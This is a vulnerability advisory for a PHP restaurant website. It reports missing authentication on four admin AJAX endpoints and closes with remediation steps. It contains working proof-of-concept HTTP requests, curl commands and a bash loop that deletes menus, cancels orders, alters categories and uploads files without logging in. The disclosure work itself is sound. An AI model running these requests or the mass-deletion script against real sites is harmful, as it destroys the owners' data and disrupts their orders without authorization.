# Restaurant Website PHP MySQL v1.0 /admin/ajax_files/*.php Missing Authentication (Unauthenticated Admin Operations)

## NAME OF AFFECTED PRODUCT(S)

Restaurant Website PHP MySQL

### Vendor Homepage

https://github.com/jairiidriss/restaurant-website-php-mysql

## AFFECTED AND/OR FIXED VERSION(S)

### submitter

Fklov

### Vulnerable Files

`/admin/ajax_files/menus_ajax.php`
`/admin/ajax_files/dashboard_ajax.php`
`/admin/ajax_files/menu_categories_ajax.php`
`/admin/ajax_files/gallery_ajax.php`

### VERSION(S)

v1.0

## PROBLEM TYPE

### Vulnerability Type

Missing Authentication for Critical Function → Unauthenticated Administrative Operations

### Root Cause

A critical missing authentication vulnerability was found in all AJAX handler files within the `/admin/ajax_files/` directory of the Restaurant Website PHP MySQL application. These endpoints handle sensitive administrative operations — deleting menus, canceling/delivering orders, deleting/adding menu categories, and uploading images — yet **none of them perform any session authentication check**.

Unlike the main administrative pages (`/admin/menus.php`, `/admin/dashboard.php`, `/admin/menu_categories.php`, `/admin/gallery.php`) which all enforce:

```php
if(isset($_SESSION['username_restaurant_qRewacvAqzA']) && 
   isset($_SESSION['password_restaurant_qRewacvAqzA']))
{
    // allow access
}
else
{
    header('Location: index.php');
    exit();
}
```

The AJAX handler files contain **zero authentication logic**:

```php
// admin/ajax_files/menus_ajax.php — No session_start(), no auth check
<?php include '../connect.php'; ?>
<?php include '../Includes/functions/functions.php'; ?>

<?php
    if(isset($_POST['do_']) && $_POST['do_'] == "Delete")
    {
        $menu_id = $_POST['menu_id'];
        $stmt = $con->prepare("DELETE from menus where menu_id = ?");
        $stmt->execute(array($menu_id));
    }
?>
```

The same pattern exists in all four AJAX files: direct database connection, no `session_start()`, no session variable validation. Any remote attacker can invoke these endpoints directly to perform destructive administrative operations.

### Impact

Attackers can exploit this missing authentication to perform **unauthenticated administrative operations** including:

- **Delete all menus** — wipe the entire menu catalog via `/admin/ajax_files/menus_ajax.php`
- **Cancel or deliver orders arbitrarily** — disrupt business operations via `/admin/ajax_files/dashboard_ajax.php`
- **Delete all menu categories** — destroy the category structure via `/admin/ajax_files/menu_categories_ajax.php`
- **Add arbitrary menu categories** — pollute the database via `/admin/ajax_files/menu_categories_ajax.php`
- **Upload arbitrary images** — abuse image gallery via `/admin/ajax_files/gallery_ajax.php`

This vulnerability allows any unauthenticated remote attacker to perform destructive data manipulation across the entire application, effectively rendering the administrative authentication system useless for these critical operations.

## DESCRIPTION

During security review of Restaurant Website PHP MySQL v1.0, a systemic missing authentication vulnerability was discovered across all AJAX administrative endpoints. While the main admin panel pages correctly enforce session-based authentication, the corresponding AJAX handlers — which perform the actual database mutations — completely lack any authorization mechanism.

**No login, no session cookie, and no authorization of any kind is required to exploit these vulnerabilities.**

## Vulnerability Details and PoC

### Vulnerable Parameters

| File | Parameter | Operation |
|------|-----------|-----------|
| `menus_ajax.php` | `menu_id` (POST), `do_` (POST) | Delete any menu |
| `dashboard_ajax.php` | `order_id` (POST), `do_` (POST), `cancellation_reason_order` (POST) | Deliver/Cancel any order |
| `menu_categories_ajax.php` | `category_id` (POST), `do` (POST), `category_name` (POST) | Delete/Add menu categories |
| `gallery_ajax.php` | `do` (POST), `image_name` (POST), `image` (FILES) | Upload gallery images |

### Environment Identified

- **Back-end DBMS**: MySQL (PDO driver)
- **Web Server OS**: Linux Ubuntu 22.04 LTS
- **Web Application Technology**: PHP 8.1, Apache 2.4
- **Authentication Mechanism**: Session-based (SHA1-hashed password)

### PoC 1: Unauthenticated Menu Deletion

```
POST /admin/ajax_files/menus_ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

do_=Delete&menu_id=1
```

**Response**: HTTP 200 (no body) — The menu with `menu_id=1` is permanently deleted from the `menus` table.

**Verification**: Visit `TARGET/index.php` — the deleted menu item no longer appears in the "DISCOVER OUR MENUS" section.

### PoC 2: Unauthenticated Order Manipulation (Deliver)

```
POST /admin/ajax_files/dashboard_ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

do_=Deliver_Order&order_id=10
```

**Response**: HTTP 200 (no body) — Order `order_id=10` is marked as `delivered = 1`.

### PoC 3: Unauthenticated Order Cancellation

```
POST /admin/ajax_files/dashboard_ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

do_=Cancel_Order&order_id=10&cancellation_reason_order=Malicious+cancellation
```

**Response**: HTTP 200 (no body) — Order `order_id=10` is marked as `canceled = 1` with attacker-supplied reason.

### PoC 4: Unauthenticated Category Deletion

```
POST /admin/ajax_files/menu_categories_ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

do=Delete&category_id=1
```

**Response**: HTTP 200 (no body) — Category `category_id=1` ("burgers") is permanently deleted. All menus under this category become orphaned.

### PoC 5: Unauthenticated Category Addition

```
POST /admin/ajax_files/menu_categories_ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

category_name=MaliciousCategory&do=Add
```

**Response**: `{"alert":"Success","message":"The new category has been inserted successfully !"}` — An attacker-injected category now appears in the admin panel.

### PoC 6: Unauthenticated Image Upload

```
POST /admin/ajax_files/gallery_ajax.php HTTP/1.1
Host: TARGET
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="do"

Add
------Boundary
Content-Disposition: form-data; name="image_name"

InjectedImage
------Boundary
Content-Disposition: form-data; name="image"; filename="malicious.jpg"

<arbitrary file content>
------Boundary--
```

**Response**: `Great! Image has been inserted successfully.` — An attacker-controlled image is inserted into the `image_gallery` table without authentication.

### PoC 7: Curl Proof (No Authentication Required)

```bash
# Delete menu #1 — no cookies, no session, no token
curl -X POST http://TARGET/admin/ajax_files/menus_ajax.php \
  -d "do_=Delete&menu_id=1"

# Cancel order #10 — no cookies, no session, no token
curl -X POST http://TARGET/admin/ajax_files/dashboard_ajax.php \
  -d "do_=Cancel_Order&order_id=10&cancellation_reason_order=hacked"

# Delete category #1 — no cookies, no session, no token
curl -X POST http://TARGET/admin/ajax_files/menu_categories_ajax.php \
  -d "do=Delete&category_id=1"

# Add malicious category — no cookies, no session, no token
curl -X POST http://TARGET/admin/ajax_files/menu_categories_ajax.php \
  -d "do=Add&category_name=HackedCategory"
```

### PoC 8: Mass Destruction Script

```bash
#!/bin/bash
# Delete all menu items in one shot — unauthenticated
TARGET="http://TARGET"
for id in $(seq 1 50); do
  curl -s -X POST "$TARGET/admin/ajax_files/menus_ajax.php" \
    -d "do_=Delete&menu_id=$id" &
done
wait
echo "All menus deleted without authentication"
```

### Code Comparison: Protected vs. Unprotected

**Protected Page** (`/admin/menus.php` — enforces authentication):

```php
<?php
    ob_start();
    session_start();                                          // ✅ Session started
    // ...
    if(isset($_SESSION['username_restaurant_qRewacvAqzA']) && // ✅ Auth checked
       isset($_SESSION['password_restaurant_qRewacvAqzA']))
    {
        include 'connect.php';
        // ... business logic ...
    }
    else
    {
        header('Location: index.php');                        // ✅ Redirect if unauthenticated
        exit();
    }
?>
```

**Vulnerable AJAX Handler** (`/admin/ajax_files/menus_ajax.php` — no authentication):

```php
<?php include '../connect.php'; ?>                            // ❌ No session_start()
<?php include '../Includes/functions/functions.php'; ?>       // ❌ No auth check at all

<?php
    if(isset($_POST['do_']) && $_POST['do_'] == "Delete")    // ❌ Directly processes request
    {
        $menu_id = $_POST['menu_id'];
        $stmt = $con->prepare("DELETE from menus where menu_id = ?");
        $stmt->execute(array($menu_id));
    }
?>
```

This pattern is identically repeated across all four AJAX files.

## Suggested Repair

1. **Add mandatory session authentication** at the top of every AJAX handler file:

```php
<?php
    session_start();
    include '../connect.php';
    include '../Includes/functions/functions.php';

    // Enforce authentication for ALL AJAX endpoints
    if(!isset($_SESSION['username_restaurant_qRewacvAqzA']) || 
       !isset($_SESSION['password_restaurant_qRewacvAqzA']))
    {
        http_response_code(403);
        echo json_encode(['error' => 'Unauthorized']);
        exit();
    }

    // ... business logic ...
?>
```

2. **Implement CSRF token validation** for all state-changing operations to prevent cross-site request forgery attacks against authenticated administrators.

3. **Add rate limiting** on AJAX endpoints to slow automated mass-destruction attacks.

4. **Implement audit logging** for all administrative operations (create, update, delete) to enable incident detection and forensic investigation.

5. **Use HTTP method enforcement** — ensure destructive operations require POST and reject GET requests.

6. **Apply input validation** — validate that `menu_id`, `order_id`, `category_id` parameters are positive integers before processing.

---

